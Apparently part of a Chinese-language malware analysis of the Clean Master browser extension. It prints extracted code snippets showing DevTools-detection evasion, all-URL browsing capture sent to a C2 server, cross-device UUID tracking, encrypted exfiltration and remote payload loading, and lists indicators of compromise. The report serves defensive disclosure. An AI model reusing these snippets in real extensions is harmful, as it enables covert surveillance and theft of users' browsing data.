
# 关于 `match` 字段的说明

在提取的配置中存在 `"match": "\\.baidu.com$"` 字段，但经审计发现：

1. **静态代码中未使用**：在 `fuck.js` 的 Service Worker 逻辑中，并未发现任何使用该正则表达式进行 URL 匹配的代码。
2. **当前 Payload 为全量监控**：提取到的 `src_str` 代码使用 `urls: ["<all_urls>"]` 监听所有网站流量，而非仅针对 `baidu.com`。
3. **字段用途存疑**：`match` 字段可能是 C2 配置框架的保留字段，用于服务端管理、未来功能扩展，或用于其他未被提取到的 Payload 配置中。由于 C2 服务器已不可访问，无法获取完整的配置历史，其确切用途尚不明确。

## 3.5.1 反分析与逃逸机制

代码中包含一段针对开发者工具（DevTools）的检测逻辑，用于在安全分析人员调试时隐藏恶意行为。

```javascript
1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16
chrome.runtime.onMessage.addListener(
function (msg) {
  if (msg.type === "on-devtools-open") {
    // ... 更新 consoleCount 状态 ...
    chrome.storage.local.set({ consoleCount: consoleCount });
  }
});

// 在发送数据前检查
sendData: function (t) {
  chrome.storage.local.get("consoleCount", function (data) {
    // 如果检测到 DevTools 开启 (consoleCount 不为空)，则停止发送数据
    if (!data.consoleCount || Object.keys(data.consoleCount).length < 1) {
      // ... 执行发送逻辑 ...
    }
  });
}
```

- **原理**：插件监听 `on-devtools-open` 消息（可能由插件的其他组件触发），一旦检测到开发者工具开启，就在本地存储中标记。
- **目的**：在 `sendData` 函数中，代码会检查这个标记。如果发现正在被调试，它会直接**静默停止数据回传**，导致分析人员抓不到网络包。

## 3.5.2 全流量数据窃取

Payload 注册了 `chrome.webRequest.onCompleted` 监听器，监控浏览器中所有的主框架（`main_frame`）请求。

```javascript
1  2  3  4  5  6  7
chrome.webRequest.onCompleted.addListener(
  this.handlerOnCompletedWebRequest.bind(this),
  {
    urls: ["<all_urls>"], // 监听所有 URL
    types: ["main_frame"],
  }
);
```

窃取的数据字段极其详尽，足以完整画像用户的浏览行为：

```javascript
1  2  3  4  5  6  7  8  9  10  11  12
handlerOnCompletedWebRequest: function (x) {
  this.sendData({
    user_id: this.uuid, //用户唯一标识
    target_url: encodeURI(x.url), //目标 URL
    referrer_url: this.refs[x.tabId] || x.initiator, //来源 URL
    user_agent: navigator.userAgent, //User Agent
    method: x.method, //HTTP 方法
    status_code: x.statusCode, //状态码
    ext_id: chrome.runtime.id, // 当前恶意插件的唯一 ID
    client_timestamp: x.timeStamp, //记录数据被窃取的精确时间
  });
}
```

## 3.5.3 持久化身份追踪

代码会生成一个 UUID 并存储在 `chrome.storage.sync` 中。

```javascript
1  2  3  4
chrome.storage.sync.get(["uuid"], function (data) {
  self.uuid = data.uuid = data.uuid ? data.uuid : self.makeUUID();
  chrome.storage.sync.set({ uuid: data.uuid }, function () {});
});
```

- **危害**：使用 `storage.sync` 意味着这个唯一的追踪 ID 会随着用户的 Google/Edge 账号同步到所有设备。攻击者不仅能追踪单台设备，还能跨设备关联用户的身份。

## 3.5.4 加密数据回传

- **C2 服务器**：`d53K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7r3W2Q4x3X3g2U0L8r3g2S2L8X3#2S2M7%4c8W2M7Y4y4Q4x3X3g2K6N6r3!0J5k6g2)9J5c8X3q4T1j5H3`.
- **加密方式**：使用硬编码密钥 `2646294A404E635266546A576E5A7234` 对数据进行加密。

```javascript
1  2  3
var key = "2646294A404E635266546A576E5A7234";
// ...
q.data = browserify_bridge.encode(q.data, key); // 加密
```

# 4. 攻击链复盘

1. **安装**：用户安装伪装的插件。
2. **启动**：浏览器加载 `background/bg.js`，随即加载 `background/fuck.js`。
3. **指令获取**：`fuck.js` 访问 `api.extensionplay.com` 获取配置。
4. **Payload 下载**：根据配置下载恶意 JS 代码。
5. **执行**：使用内置的 `interpreter.js` 执行下载的代码，或者通过 `fetch` 监听器劫持特定网络请求。
6. **恶意行为**：执行具体的恶意逻辑，取决于动态下发的 Payload。虽然笔者尝试从恶意接口中下载样本失败，但在本地浏览器管理的 LevelDB 数据库中成功提取到了历史下载的恶意代码。

# 5. 关联事件与争议说明（WeTab / Infinity）

在本次披露的报告中，除了 **Clean Master** 被实锤包含恶意代码外，知名的 **WeTab** 和 **Infinity** 扩展也被列入了 ShadyPanda 组织的关联名单中。报告指控这些扩展可能涉及数据收集等行为（被称为“阶段 2”和“阶段 4”的活动）。

然而，针对这一指控及随后的下架处理，**WeTab 和 Infinity 官方已发布声明进行澄清**。为了保持客观中立，现将官方声明要点摘录如下，供读者参考：

1. **账号关联导致误伤**：官方表示，WeTab 与 Infinity 的下架是因为它们与 Clean Master 曾使用**同一开发者账号**上架。当 Clean Master 因恶意代码被封禁时，平台出于风控策略，对该账号下的所有扩展采取了“连坐”措施。
2. **否认恶意行为**：声明强调，WeTab 与 Infinity 的下架**并非**因为这两款扩展自身存在恶意代码或安全问题。
3. **代码安全承诺**：官方承诺，用户本地已安装的 WeTab / Infinity 版本代码保持不变，**不存在临时植入后门或新增恶意行为的情况**。
4. **积极申诉中**：目前开发团队已向平台提交了技术说明与安全自查结果，正在积极沟通以恢复上架。

**笔者注**：

- 对于 **Clean Master**，本文的分析已证实其包含明确的恶意加载器（`fuck.js`）和 CSP 绕过机制（`interpreter.js`），属于确凿的恶意软件。
- 对于 **WeTab / Infinity**，目前尚未在公开样本中发现与 Clean Master 相同的恶意加载器代码。建议用户关注官方后续的申诉结果及安全厂商的进一步分析。

# 6. 威胁指标（IOCs）

- **C2 Domain**：
  - `api.extensionplay.com`（Clean Master 核心 C2）
  - `api.cleanmasters.store`（Payload 中发现的数据回传域名）
  - `cleanmasters.store`（报告提及的数据回传域名）
  - 更多的可以参考原文
- **URL**：
  - `7d8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7r3W2Q4x3X3g2W2P5s2c8W2L8Y4y4A6L8$3&6H3L8r3q4&6i4K6u0W2j5$3!0E0i4K6u0r3j5$3I4W2j5h3&6Q4y4h3k6E0j5i4y4@1k6i4u0Q4x3V1k6@1i4K6u0W2K9Y4y4G2L8R3`.
  - `5f9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7r3W2Q4x3X3g2U0L8r3g2S2L8X3#2S2M7%4c8W2M7Y4y4Q4x3X3g2K6N6r3!0J5k6g2)9J5c8X3q4T1j5H3`.（数据回传接口）
- **Encryption Key**：`2646294A404E635266546A576E5A7234`（用于加密回传数据）
- **恶意文件特征**：
  - 文件名：`fuck.js`
  - 本地存储 Key：`"fuck"`
  - 代码特征：使用 `interpreter.run` 执行远程代码。

# 7. 总结与碎碎念

这种攻击手法其实并没有那么复杂，主要利用了平台对更新的审查不严，但沉淀了这么久才开始动手……确实防不胜防。

**最后给大伙儿提个醒：** 赶紧查查自己的浏览器插件列表，看到 Edge 的插件封禁安全提示，就说明你有可能中招了，看看自己有没有安装 Clean Master 插件吧。

# 参考链接

`67eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2C8L8$3W2Q4x3X3g2S2K9g2)9J5c8X3u0D9L8$3N6Q4x3V1j5@1i4K6u0V1L8h3W2D9L8r3W2G2L8W2)9J5k6r3u0J5L8%4N6K6k6i4u0K6i4K6u0V1K9h3&6X3k6h3y4@1k6h3c8Q4x3X3c8A6L8Y4y4A6k6r3g2Q4x3X3c8K6K9r3q4V1P5i4m8S2L8X3c8S2i4K6u0V1y4#2)9J5k6s2W2W2j5i4u0Q4x3X3c8E0j5h3I4%4j5i4u0W2i4K6u0V1j5$3q4E0M7r3q4A6k6$3&6Q4x3U0y4Z5k6h3q4V1K9h3&6Y4i4K6u0V1x3b7`.

[冰与火的战歌：Windows 内核攻防实战高级班！从零到实战，融合 AI 与 Windows 内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
